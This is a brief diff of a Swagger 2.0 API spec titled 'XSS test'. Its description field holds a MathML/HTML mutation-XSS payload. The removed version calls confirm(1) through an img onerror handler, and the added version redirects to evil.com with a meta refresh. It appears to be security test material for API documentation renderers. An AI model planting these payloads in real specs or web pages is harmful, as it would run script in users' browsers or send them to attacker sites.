@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description: <math><mtext><h1 on='a'>hekars</h1><img src=1 onerror=(confirm)(1)>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1 on='a'>hekars</h1><meta http-equiv='refresh' content='0;url=https://evil.com'>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
